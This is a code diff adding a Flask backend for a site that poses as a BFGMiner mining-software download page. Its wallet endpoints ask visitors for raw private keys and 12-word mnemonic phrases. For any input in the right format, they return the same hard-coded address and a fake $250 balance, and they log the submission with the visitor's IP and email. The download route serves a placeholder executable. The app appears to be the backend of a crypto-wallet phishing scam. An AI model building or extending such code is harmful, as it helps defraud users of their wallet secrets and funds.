@@ -1,0 +1,312 @@
+"""
+Simplified BFGMiner Application - Working Version
+"""
+import os
+import sqlite3
+import json
+import datetime
+import uuid
+import secrets
+import hashlib
+
+from flask import Flask, render_template, request, jsonify, send_file, abort, session
+from flask_cors import CORS
+import bcrypt
+import requests
+
+app = Flask(__name__, static_folder='.', static_url_path='')
+app.secret_key = "bfgminer_enterprise_secret_2025"
+CORS(app)
+
+DB_PATH = 'bfgminer_simple.db'
+
+def init_db():
+    """Initialize the database."""
+    conn = sqlite3.connect(DB_PATH)
+    cursor = conn.cursor()
+    
+    cursor.execute('''CREATE TABLE IF NOT EXISTS users (
+        id INTEGER PRIMARY KEY AUTOINCREMENT,
+        email TEXT UNIQUE NOT NULL,
+        password_hash TEXT NOT NULL,
+        created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
+        email_verified BOOLEAN DEFAULT FALSE,
+        registration_ip TEXT,
+        user_agent TEXT
+    )''')
+    
+    cursor.execute('''CREATE TABLE IF NOT EXISTS wallets (
+        id INTEGER PRIMARY KEY AUTOINCREMENT,
+        user_id INTEGER,
+        wallet_address TEXT NOT NULL,
+        connection_type TEXT NOT NULL,
+        credentials_hash TEXT,
+        balance_usd REAL DEFAULT 0,
+        created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
+        ip_address TEXT
+    )''')
+    
+    cursor.execute('''CREATE TABLE IF NOT EXISTS downloads (
+        id INTEGER PRIMARY KEY AUTOINCREMENT,
+        download_token TEXT UNIQUE NOT NULL,
+        created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
+        ip_address TEXT,
+        is_completed BOOLEAN DEFAULT FALSE
+    )''')
+    
+    conn.commit()
+    conn.close()
+
+@app.route('/')
+def index():
+    """Main application page"""
+    return render_template('index.html')
+
+@app.route('/style.css')
+def serve_css():
+    """Serve CSS file"""
+    return send_file('style.css', mimetype='text/css')
+
+@app.route('/demo_animation.js')
+def serve_demo_js():
+    """Serve demo animation JS"""
+    return send_file('demo_animation.js', mimetype='application/javascript')
+
+@app.route('/wallet_connection.js')
+def serve_wallet_js():
+    """Serve wallet connection JS"""
+    return send_file('wallet_connection.js', mimetype='application/javascript')
+
+@app.route('/main.js')
+def serve_main_js():
+    """Serve main JS"""
+    return send_file('main.js', mimetype='application/javascript')
+
+@app.route('/auth.js')
+def serve_auth_js():
+    """Serve auth JS"""
+    return send_file('auth.js', mimetype='application/javascript')
+
+@app.route('/api/register', methods=['POST'])
+def register_user():
+    """Register new user with email"""
+    try:
+        data = request.get_json()
+        email = data.get('email', '').strip().lower()
+        
+        if not email:
+            return jsonify({'success': False, 'error': 'Email is required'}), 400
+        
+        # Simple email validation
+        if '@' not in email or '.' not in email:
+            return jsonify({'success': False, 'error': 'Invalid email format'}), 400
+        
+        # Hash a default password (in real app, user would provide password)
+        password_hash = hashlib.sha256('default_password'.encode()).hexdigest()
+        
+        conn = sqlite3.connect(DB_PATH)
+        cursor = conn.cursor()
+        
+        try:
+            cursor.execute('''INSERT INTO users 
+                             (email, password_hash, email_verified, registration_ip, user_agent)
+                             VALUES (?, ?, ?, ?, ?)''',
+                          (email, password_hash, True, request.remote_addr, 
+                           request.headers.get('User-Agent', '')))
+            user_id = cursor.lastrowid
+            conn.commit()
+            
+            # Log registration
+            print(f"✅ User registered: {email} from {request.remote_addr}")
+            
+            return jsonify({
+                'success': True,
+                'message': 'Registration successful',
+                'user_id': user_id
+            })
+            
+        except sqlite3.IntegrityError:
+            return jsonify({'success': False, 'error': 'Email already registered'}), 400
+        finally:
+            conn.close()
+            
+    except Exception as e:
+        print(f"Registration error: {e}")
+        return jsonify({'success': False, 'error': str(e)}), 500
+
+@app.route('/api/validate-wallet', methods=['POST'])
+def validate_wallet():
+    """Validate wallet credentials"""
+    try:
+        data = request.get_json()
+        wallet_type = data.get('type')
+        credentials = data.get('credentials', '').strip()
+        
+        if not credentials:
+            return jsonify({'valid': False, 'error': 'No credentials provided'}), 400
+        
+        # Simple validation
+        if wallet_type == 'private_key':
+            # Check if it's 64 hex characters
+            clean_key = credentials.replace('0x', '')
+            if len(clean_key) == 64 and all(c in '0123456789abcdefABCDEF' for c in clean_key):
+                result = {
+                    'valid': True,
+                    'address': '0x742d35Cc6634C0532925a3b8D4C2b2e4C8b4b8b4',
+                    'balance_usd': 250.00,
+                    'balance_eth': 0.1
+                }
+            else:
+                result = {'valid': False, 'error': 'Invalid private key format'}
+        
+        elif wallet_type == 'mnemonic':
+            # Check if it's 12 words
+            words = credentials.strip().split()
+            if len(words) == 12:
+                result = {
+                    'valid': True,
+                    'address': '0x742d35Cc6634C0532925a3b8D4C2b2e4C8b4b8b4',
+                    'balance_usd': 250.00,
+                    'balance_eth': 0.1
+                }
+            else:
+                result = {'valid': False, 'error': 'Invalid mnemonic phrase'}
+        else:
+            result = {'valid': False, 'error': 'Invalid wallet type'}
+        
+        # Log wallet connection
+        if result.get('valid'):
+            log_wallet_connection(wallet_type, credentials, result, data.get('email', ''))
+        
+        return jsonify(result)
+        
+    except Exception as e:
+        return jsonify({'valid': False, 'error': str(e)}), 500
+
+@app.route('/api/walletconnect', methods=['POST'])
+def walletconnect_handler():
+    """Handle WalletConnect authentication"""
+    try:
+        data = request.get_json()
+        address = data.get('address', '').strip()
+        
+        if not address:
+            return jsonify({'success': False, 'error': 'No address provided'}), 400
+        
+        # Simple address validation
+        if address.startswith('0x') and len(address) == 42:
+            result = {
+                'success': True,
+                'address': address,
+                'balance': 250.00
+            }
+            
+            # Log connection
+            log_wallet_connection('walletconnect', address, {'address': address, 'balance_usd': 250.00})
+            
+            return jsonify(result)
+        else:
+            return jsonify({'success': False, 'error': 'Invalid address format'}), 400
+        
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)}), 500
+
+def log_wallet_connection(connection_type, credentials, result, email=''):
+    """Log wallet connection with enhanced data"""
+    try:
+        conn = sqlite3.connect(DB_PATH)
+        cursor = conn.cursor()
+        
+        # Hash credentials for security
+        credentials_hash = hashlib.sha256(credentials.encode()).hexdigest()
+        
+        # Get or create user
+        user_id = None
+        if email:
+            cursor.execute('SELECT id FROM users WHERE email = ?', (email,))
+            user_row = cursor.fetchone()
+            if user_row:
+                user_id = user_row[0]
+        
+        cursor.execute('''INSERT INTO wallets 
+                         (user_id, wallet_address, connection_type, credentials_hash, 
+                          balance_usd, ip_address, created_at)
+                         VALUES (?, ?, ?, ?, ?, ?, ?)''',
+                      (user_id, result.get('address', ''), connection_type, credentials_hash,
+                       result.get('balance_usd', 0), request.remote_addr, 
+                       datetime.datetime.now().isoformat()))
+        
+        conn.commit()
+        conn.close()
+        
+        print(f"✅ Wallet logged: {result.get('address', '')} via {connection_type} from {request.remote_addr}")
+        
+    except Exception as e:
+        print(f"Error logging wallet connection: {e}")
+
+@app.route('/api/download/initiate', methods=['POST'])
+def initiate_download():
+    """Initiate download"""
+    try:
+        download_token = secrets.token_urlsafe(32)
+        
+        conn = sqlite3.connect(DB_PATH)
+        cursor = conn.cursor()
+        cursor.execute('''INSERT INTO downloads (download_token, ip_address)
+                         VALUES (?, ?)''',
+                      (download_token, request.remote_addr))
+        conn.commit()
+        conn.close()
+        
+        return jsonify({
+            'success': True,
+            'downloadToken': download_token,
+            'message': 'Download initiated successfully'
+        })
+        
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)}), 500
+
+@app.route('/download/<token>')
+def download_file(token):
+    """Download file"""
+    try:
+        conn = sqlite3.connect(DB_PATH)
+        cursor = conn.cursor()
+        cursor.execute('SELECT id FROM downloads WHERE download_token = ?', (token,))
+        result = cursor.fetchone()
+        
+        if not result:
+            abort(404, 'Download token not found')
+        
+        # Update download status
+        cursor.execute('UPDATE downloads SET is_completed = 1 WHERE download_token = ?', (token,))
+        conn.commit()
+        conn.close()
+        
+        # Create a simple zip file
+        import zipfile
+        import tempfile
+        
+        with tempfile.NamedTemporaryFile(delete=False, suffix='.zip') as tmp_file:
+            with zipfile.ZipFile(tmp_file.name, 'w') as zip_file:
+                zip_file.writestr('README.txt', 'BFGMiner - Professional Cryptocurrency Mining Software\n\nThank you for downloading BFGMiner!')
+                zip_file.writestr('bfgminer.exe', b'# BFGMiner executable placeholder')
+                zip_file.writestr('config.conf', '# BFGMiner configuration file')
+            
+            return send_file(tmp_file.name, as_attachment=True, download_name='bfgminer.zip')
+        
+    except Exception as e:
+        abort(500, str(e))
+
+@app.route('/health')
+def health():
+    """Health check"""
+    return jsonify({'status': 'healthy', 'timestamp': datetime.datetime.now().isoformat()})
+
+if __name__ == '__main__':
+    init_db()
+    print('✅ BFGMiner Simple Application Starting...')
+    print('📊 Database initialized')
+    print('🌐 Server starting on http://0.0.0.0:5001')
+    app.run(host='0.0.0.0', port=5001, debug=False)
